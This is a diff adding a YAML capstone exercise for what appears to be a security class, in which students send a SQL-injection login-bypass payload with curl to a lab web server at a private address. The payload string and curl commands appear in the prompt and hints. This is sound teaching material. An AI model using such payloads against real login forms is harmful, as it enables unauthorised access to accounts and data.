@@ -1,0 +1,24 @@
+id: "05"
+title: "SQL injection — the classic (capstone)"
+prompt: |
+  p-web-02 (172.16.10.12) has a login form that trusts input. Test it.
+
+  1. The form posts to /login.php with fields username and password.
+     Try a classic auth-bypass payload in the username field:
+       admin' OR '1'='1' -- 
+     (any password)
+  2. Use curl to send it and capture the response:
+     curl -s -X POST http://172.16.10.12/login.php \
+       -d "username=admin' OR '1'='1' -- &password=x" \
+       -o ~/kali-class-work/sec-wk08/sqli-login.txt
+  3. Look at the response: if it contains a session/welcome marker, the
+     bypass worked.
+  4. Stamp it: kali-class stamp sec-wk08 sqli
+hints:
+  - "Single quote closes the string, OR 1=1 makes the WHERE clause always true."
+  - "URL-encode if needed: curl --data-urlencode \"username=admin' OR '1'='1' -- \" --data-urlencode password=x http://172.16.10.12/login.php"
+  - "Success indicator: the response contains 'Welcome' or a session marker."
+verify:
+  script: "05-sqli-bypass.verify.sh"
+  timeout: 30
+on_success: "Authentication bypassed with a quote and a tautology. OWASP A03 in action."
